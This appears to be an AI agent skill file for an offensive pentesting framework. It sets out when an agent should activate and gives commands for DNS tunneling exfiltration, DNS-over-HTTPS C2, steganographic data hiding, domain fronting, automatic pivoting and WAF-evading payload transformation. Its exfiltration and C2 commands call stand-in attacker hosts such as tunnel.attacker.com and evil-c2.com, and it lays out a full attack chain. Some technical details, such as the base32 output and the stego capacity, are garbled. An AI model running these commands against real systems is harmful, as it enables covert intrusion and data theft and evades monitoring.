---
name: drakben-framework
description: DRAKBEN - Autonomous pentesting framework with DNS tunneling, steganography, Domain Fronting, auto-pivoting. v2.5 has 228 files, 38 attack modules. Use for covert C2, data exfiltration, advanced pivoting.
---

> ⚠️ **SECURITY NOTICE**: Only use on systems you own or have explicit written authorization for. Unauthorized access is illegal.

# DRAKBEN Framework

Autonomous AI-powered penetration testing framework. v2.5.0 with DNS tunneling, steganography, Domain Fronting, and automatic TunnelManager pivoting.

## When to Activate

- "DNS tunneling", "DNS exfiltration", "DNS C2"
- "steganography", "hide data in images"
- "domain fronting", "C2 behind CDN"
- "auto pivot", "TunnelManager"
- "WAF bypass", "stealth C2"
- "DRAKBEN", "autonomous pentest"
- CTF: "covert channel", "data hidden in images", "DNS exfil"

## Core Concepts

### Key Capabilities

| Feature | Description | Use Case |
|---------|-------------|----------|
| DNS Tunneling | Data encoded in DNS queries | Exfil through firewall |
| DNS-over-HTTPS | Encrypted DNS C2 | Bypass DNS monitoring |
| Steganography | LSB encoding in images | Hide data |
| Domain Fronting | C2 behind CDNs | Hide C2 infrastructure |
| Auto-Pivoting | TunnelManager | Automatic lateral movement |
| WAF Bypass | Intelligent evasion | Web app testing |

### Architecture

```
[Attacker] <--DNS/HTTPS--> [DNS Server] <--DNS--> [Compromised Host]
                                    |
                              [CDN (Domain Fronting)]
                                    |
                              [C2 Infrastructure]
```

## Workflow

### Step 1: Local Installation

**Already installed at:**
```
/home/anini39/.config/opencode/tools/drakben/
```

**Dependencies installed in:**
```
/home/anini39/.config/opencode/tools/drakben/.venv/
```

### Step 2: Start DRAKBEN

```bash
git clone https://github.com/ahmetdrak/drakben.git
cd drakben
python3 -m venv .venv
source .venv/bin/activate
pip install -r requirements.txt
python3 drakben.py
```

### Step 3: Configure DNS Tunneling

```bash
# Inside DRAKBEN shell
set PROTOCOL dns
set DOMAIN your-tunnel-domain.com
set LPORT 53
exploit
```

### Step 4: Setup DNS Server for Tunneling

```bash
# On your DNS server, configure zone for tunneling
# NS records pointing to your tunnel server
```

### Step 5: DNS Exfiltration Commands

```bash
# Test DNS exfil
exfil_test -data "secret data"

# Start listener
dns_listener -lport 53

# Encode and send data via DNS TXT records
dns_exfil --encode base64 --domain tunnel.attacker.com
```

### Step 6: Steganography Data Hiding

```bash
# Hide data in image (LSB encoding)
stego_encode -image cover.jpg -data secret.txt -output payload.png

# Extract hidden data
stego_decode -image payload.png -output extracted.txt

# Automated stego + exfil
stego_exfil -image innocent.png -data "C2 commands here"
```

### Step 7: Domain Fronting C2

```bash
# Configure CDN fronting
set FRONTING_DOMAIN legitimate-cdn.com
set C2_DOMAIN evil-c2.com
# Traffic goes: Attacker -> CDN -> evil-c2.com

# Start fronted C2
domain_fronting -provider cloudflare -front yourcdn.com
```

### Step 8: Auto-Pivot with TunnelManager

```bash
# Inside session on compromised host
tunnel_manager -mode auto

# Automatically discovers and pivots through:
# - New subnets
# - Routers
# - Firewalls
# Creates tunnels to each discovered network
```

## DNS Tunneling Deep Dive

### How DNS Tunneling Bypasses Firewalls

```
Normal: [Client] --TCP/80--> [Web] 
Blocked: [Client] --TCP/80--> [Firewall] --X--> [Web]

DNS:    [Client] --UDP/53--> [DNS Resolver] ---> [Attacker]
        UDP/53 is almost always allowed!
```

### Encoding Data in DNS

```bash
# Base32 encoding for DNS (only uppercase + numbers)
echo "secret" | base32 | tr -d '='
# SECRET

# DNS TXT record query carries data
# subdomain.base32data.attacker.com
# Attacker extracts subdomain, decodes
```

### DNS-over-HTTPS (DoH) C2

```bash
# Even DNS queries are encrypted
doh_c2 -provider cloudflare -domain tunnel.attacker.com
# ISP can't see the DNS queries
```

## Steganography Reference

### LSB (Least Significant Bit) Encoding

```bash
# Images use RGB values: (255, 128, 64)
# Binary: 11111111 10000000 01000000
# LSB encoding changes only the last bit:
# (254, 129, 65) -> last bits: 0 0 1
# 3 bytes per pixel = 3 bits hidden per pixel
# 1920x1080 image = 2MB hidden data capacity
```

### Best Images for Stego

```bash
# Good: Uncompressed PNG, BMP
# Bad: JPEG (lossy compression destroys LSB)

# Generate clean cover image
convert -size 1920x1080 xc:white clean.png
```

## WAF Bypass Features

### DRAKBEN's Evasion Engine

```bash
# WAF fingerprinting
waf_detect -target https://target.com

# Adaptive evasion
evasion -mode adaptive -waf cloudflare

# Payload transformation
transform -payload '<script>alert(1)</script>' -encoder base64 -obfuscate
```

## Complete Attack Chain Example

```
1. Initial Access: Exploit web vuln, get shell on DMZ server
2. Tunnel: DNS tunneling from DMZ to C2
3. Pivot: TunnelManager auto-discovers internal network
4. Exfil: Steganography hides data in images sent to blog
5. C2: Domain Fronting hides C2 behind CloudFront
```

## Installation Reference

```bash
# Docker (recommended)
git clone https://github.com/ahmetdrak/drakben.git
cd drakben
docker-compose up -d

# Manual
python3 -m venv .venv
source .venv/bin/activate
pip install -r requirements.txt
```

## Validation Checklist

- [ ] Docker container running
- [ ] DNS tunnel established and encoding/decoding works
- [ ] Stego image created and data extractable
- [ ] Domain fronting configured and C2 hidden
- [ ] TunnelManager discovers and pivots automatically
- [ ] WAF bypass successfully evades detection
